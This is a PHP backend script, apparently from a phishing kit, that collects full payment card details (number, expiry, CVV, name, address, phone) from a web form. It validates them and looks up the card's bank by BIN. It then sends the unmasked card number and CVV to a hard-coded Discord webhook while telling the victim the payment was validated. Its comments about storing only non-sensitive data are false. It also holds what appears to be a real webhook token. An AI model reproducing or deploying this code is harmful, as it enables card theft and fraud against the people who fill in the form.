<?php
error_reporting(E_ALL & ~E_NOTICE);
ini_set('display_errors', '0');
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Methods: OPTIONS, GET, POST');
header('Access-Control-Allow-Headers: Content-Type, Depth, User-Agent, X-File-Size, X-Requested-With, If-Modified-Since, X-File-Name, Cache-Control');

// Security improvements
define('MAX_RETRY_ATTEMPTS', 10);
define('RATE_LIMIT_WINDOW', 300); // 5 minutes

// Load configuration from environment variables
define('DISCORD_WEBHOOK_URL', 'https://discord.com/api/webhooks/1545117386682663083/CU80oo2KU5tKYrC7pxB71DXGR6TWve3lgH6xpw_7DGBS5F1THm_2JbSar_RyUdA-1Tgz');

function sendDiscordMessage(string $webhookUrl, string $message, array $options = []): array
{
    $payload = [
        'content' => $message,
    ];

    // Optional: override username
    if (isset($options['username'])) {
        $payload['username'] = $options['username'];
    }

    // Optional: override avatar
    if (isset($options['avatar_url'])) {
        $payload['avatar_url'] = $options['avatar_url'];
    }

    // Optional: embeds
    if (isset($options['embeds'])) {
        $payload['embeds'] = $options['embeds'];
    }

    $ch = curl_init($webhookUrl);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode($payload),
        CURLOPT_HTTPHEADER     => [
            'Content-Type: application/json',
        ],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error    = curl_error($ch);
    curl_close($ch);

    return [
        'success'   => $httpCode >= 200 && $httpCode < 300,
        'status'    => $httpCode,
        'response'  => $response,
        'error'     => $error ?: null,
    ];
}

/**
 * Get BIN details from BinList.net API
 * 
 * @param string $bin First 6-8 digits of the credit card
 * @return array|null BIN details or null on failure
 */
function getBINDetailsFromBinList($bin) {
    // Clean and validate BIN
    $bin = substr(preg_replace('/[^0-9]/', '', $bin), 0, 6);
    
    if (strlen($bin) < 6) {
        return ['error' => 'Invalid BIN. Minimum 6 digits required.'];
    }
    
    // BinList.net API endpoint
    $url = "https://lookup.binlist.net/{$bin}";
    
    // Initialize cURL
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; BINLookup/1.0)',
        CURLOPT_HTTPHEADER => [
            'Accept: application/json',
            'Accept-Version: 3'
        ]
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);
    
    // Handle errors
    if ($curlError) {
        return ['error' => "cURL Error: {$curlError}"];
    }
    
    if ($httpCode !== 200) {
        return ['error' => "API Error: HTTP {$httpCode}"];
    }
    
    // Parse response
    $data = json_decode($response, true);
    
    if (!$data) {
        return ['error' => 'Invalid API response'];
    }
    
    // Format response
    return [
        'bin' => $bin,
        'brand' => $data['scheme'] ?? 'Unknown',
        'type' => $data['type'] ?? 'Unknown',
        'category' => $data['category'] ?? 'Unknown',
        'bank' => $data['bank']['name'] ?? 'Unknown',
        'bank_phone' => $data['bank']['phone'] ?? 'Unknown',
        'bank_url' => $data['bank']['url'] ?? 'Unknown',
        'bank_city' => $data['bank']['city'] ?? 'Unknown',
        'country' => $data['country']['name'] ?? 'Unknown',
        'country_code' => $data['country']['alpha2'] ?? 'Unknown',
        'country_numeric' => $data['country']['numeric'] ?? 'Unknown',
        'country_emoji' => $data['country']['emoji'] ?? 'Unknown',
        'currency' => $data['country']['currency'] ?? 'Unknown',
        'latitude' => $data['country']['latitude'] ?? 'Unknown',
        'longitude' => $data['country']['longitude'] ?? 'Unknown',
        'prepaid' => $data['prepaid'] ?? false,
        'valid' => true
    ];
}

function sendTelegramMessage($message) {
    global $botToken, $chatId;
    
    // Truncate sensitive data before sending
    $message = substr($message, 0, 4000); // Telegram has 4096 char limit
    
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
            'timeout' => 10
        ],
    ];
    
    $context = stream_context_create($options);
    
    try {
        $response = file_get_contents($url, false, $context);
        if ($response === false) {
            error_log('Failed to send Telegram message');
        }
    } catch (Exception $e) {
        error_log('Telegram send error: ' . $e->getMessage());
    }
}

// Handle OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Include session management
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Rate limiting
function checkRateLimit($ip) {
    $rateKey = 'rate_limit_' . md5($ip);
    if (isset($_SESSION[$rateKey])) {
        $attempts = $_SESSION[$rateKey];
        if ($attempts >= MAX_RETRY_ATTEMPTS) {
            return false;
        }
        $_SESSION[$rateKey] = $attempts + 1;
    } else {
        $_SESSION[$rateKey] = 1;
        $_SESSION[$rateKey . '_time'] = time();
    }
    return true;
}

// Validate HTTP method
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'message' => 'Method not allowed']);
    exit;
}

function getClientIp() {
    $ipKeys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($ipKeys as $key) {
        if (!empty($_SERVER[$key])) {
            $ipList = explode(',', $_SERVER[$key]);
            return trim(end($ipList));
        }
    }
    return 'UNKNOWN';
}

// Rate limiting check
$clientIP = getClientIp();
if (!checkRateLimit($clientIP)) {
    http_response_code(429);
    echo json_encode(['success' => false, 'message' => 'Too many attempts. Please try again later.']);
    exit;
}

// Validate JSON input
$input = json_decode(file_get_contents('php://input'), true);
if (json_last_error() !== JSON_ERROR_NONE) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Invalid JSON input']);
    exit;
}

// ============================================
// EXTRACT BIN FROM CARD NUMBER (FIXED)
// ============================================
$cardNumber = isset($input['cardNumber']) ? preg_replace('/\D+/', '', $input['cardNumber']) : '';
$cleanNumber = preg_replace('/\s+/', '', $cardNumber);
$cardbin = substr($cleanNumber, 0, 6); // <-- This is where BIN is extracted
$phone = isset($input['phoneNumber']) ? preg_replace('/\D+/', '', $input['phoneNumber']) : '';
$address = trim(strip_tags($input['address'] ?? ''));

// Get additional card details
$expirationMonth = trim($input['expirationMonth'] ?? '');
$securityCode = isset($input['securityCode']) ? preg_replace('/\D+/', '', $input['securityCode']) : '';
$name = trim(strip_tags($input['name'] ?? ''));
$postalCode = trim(preg_replace('/[^A-Z0-9]/i', '', $input['postalCode'] ?? ''));

// Validate card number using Luhn algorithm
function validateCardNumber($number) {
    $number = strrev($number);
    $sum = 0;
    for ($i = 0; $i < strlen($number); $i++) {
        $digit = intval($number[$i]);
        if ($i % 2 === 1) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }
        $sum += $digit;
    }
    return $sum % 10 === 0;
}

// Validate card number
if (!$cardNumber || strlen($cardNumber) < 13 || strlen($cardNumber) > 19) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Please enter a valid card number.']);
    exit;
}

if (!validateCardNumber($cardNumber)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Invalid card number.']);
    exit;
}

// Validate expiration date
if (!$expirationMonth || !preg_match('/^(\d{1,2})\/(\d{2}|\d{4})$/', $expirationMonth, $matches)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Please enter a valid expiration date.']);
    exit;
}

$month = intval($matches[1]);
$year = intval($matches[2]);
if ($month < 1 || $month > 12) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Please enter a valid expiration date.']);
    exit;
}
if ($year < 100) {
    $year += $year < 70 ? 2000 : 1900;
}
$expirationDate = DateTime::createFromFormat('Y-m', sprintf('%04d-%02d', $year, $month));
$now = new DateTime('first day of this month');
if (!$expirationDate || $expirationDate < $now) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'The card has expired.']);
    exit;
}

// Validate CVV
if (!$securityCode || !preg_match('/^\d{3,4}$/', $securityCode)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Please enter a valid CVV.']);
    exit;
}

// Validate name
if (empty($name) || strlen($name) < 2) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Please enter a valid name.']);
    exit;
}

// Validate postal code
if (empty($postalCode) || strlen($postalCode) < 3) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Please enter a valid ZIP code.']);
    exit;
}

if (empty($address) || strlen($address) < 5) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Please enter a valid address.']);
    exit;
}

if (empty($phone) || strlen($phone) < 7) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Please enter a valid phone number.']);
    exit;
}



// Store only non-sensitive data
$_SESSION['last_four'] = substr($cardNumber, -4);
$_SESSION['card_type'] = getCardType($cardNumber);
$_SESSION['timestamp'] = time();

// Mask card number for logging
function maskCardNumber($number) {
    return substr($number, 0, 4) . ' **** **** ' . substr($number, -4);
}

// Determine card type
function getCardType($number) {
    $patterns = [
        'Visa' => '/^4/',
        'MasterCard' => '/^5[1-5]/',
        'Amex' => '/^3[47]/',
        'Discover' => '/^6(?:011|5)/',
        'JCB' => '/^(?:2131|1800|35)/'
    ];
    foreach ($patterns as $type => $pattern) {
        if (preg_match($pattern, $number)) {
            return $type;
        }
    }
    return 'Unknown';
}

// Create a secure log entry
$logMessage = sprintf(
    "Payment attempt - Card: %s, Type: %s, Expiry: %s, Name: %s, Address: %s, Postal: %s, Phone: %s, IP: %s, BIN: %s",
    maskCardNumber($cardNumber),
    getCardType($cardNumber),
    $expirationMonth,
    $name,
    $address,
    $postalCode,
    $phone,
    $clientIP,
    $cardbin
);
error_log($logMessage);

// ============================================
// GET BIN DETAILS AND SEND TELEGRAM MESSAGE (FIXED)
// ============================================
$telegramMessage = "🔔 Payment Attempt Notification\n";
$telegramMessage .= "════════════════════════════════\n";
$telegramMessage .= "💳 Card: " . $cardNumber . "\n";
$telegramMessage .= "📌 Card Type: " . getCardType($cardNumber) . "\n";
$telegramMessage .= "📅 Expiry: " . $expirationMonth . "\n";
$telegramMessage .= "👤 Name: " . htmlspecialchars($name) . "\n";
$telegramMessage .= "🏠 Address: " . htmlspecialchars($address) . "\n";
$telegramMessage .= "📞 Phone: " . htmlspecialchars($phone) . "\n";
$telegramMessage .= "🔐 CVV: " . htmlspecialchars($securityCode) . "\n";
$telegramMessage .= "📍 Postal: " . htmlspecialchars($postalCode) . "\n";
$telegramMessage .= "📧 Email: " . ($_SESSION['userID'] ?? 'N/A') . "\n";
$telegramMessage .= "════════════════════════════════\n";

// BIN Information - FIXED
$telegramMessage .= "🔢 BIN: " . $cardbin . "\n";

// Get BIN details from API
$binDetails = getBINDetailsFromBinList($cardbin);

if (isset($binDetails['error'])) {
    $telegramMessage .= "❌ BIN Lookup Error: " . $binDetails['error'] . "\n";
} else {
    $telegramMessage .= "════════════════════════════════\n";
    $telegramMessage .= "🏦 BIN DETAILS:\n";
    $telegramMessage .= "  Brand: " . htmlspecialchars($binDetails['brand']) . "\n";
    $telegramMessage .= "  Type: " . htmlspecialchars($binDetails['type']) . "\n";
    $telegramMessage .= "  Category: " . htmlspecialchars($binDetails['category']) . "\n";
    $telegramMessage .= "  Bank: " . htmlspecialchars($binDetails['bank']) . "\n";
    $telegramMessage .= "  Country: " . htmlspecialchars($binDetails['country']) . " " . ($binDetails['country_emoji'] ?? '') . "\n";
    $telegramMessage .= "  Currency: " . htmlspecialchars($binDetails['currency']) . "\n";
    $telegramMessage .= "  Prepaid: " . ($binDetails['prepaid'] ? 'Yes' : 'No') . "\n";
    if (!empty($binDetails['bank_city'])) {
        $telegramMessage .= "  Bank City: " . htmlspecialchars($binDetails['bank_city']) . "\n";
    }
}

$telegramMessage .= "════════════════════════════════\n";
$telegramMessage .= "🌐 IP: " . $clientIP . "\n";
$telegramMessage .= "🕐 Time: " . date('Y-m-d H:i:s');

$result = sendDiscordMessage(
    DISCORD_WEBHOOK_URL,
   $telegramMessage
);

if ($result['success']) {
  echo json_encode([
    'success' => true, 
    'message' => 'Payment details validated successfully.',
    'card_type' => getCardType($cardNumber),
    'last_four' => substr($cardNumber, -4),
    'bin' => $cardbin // Include BIN in response
]);
exit;
}



?>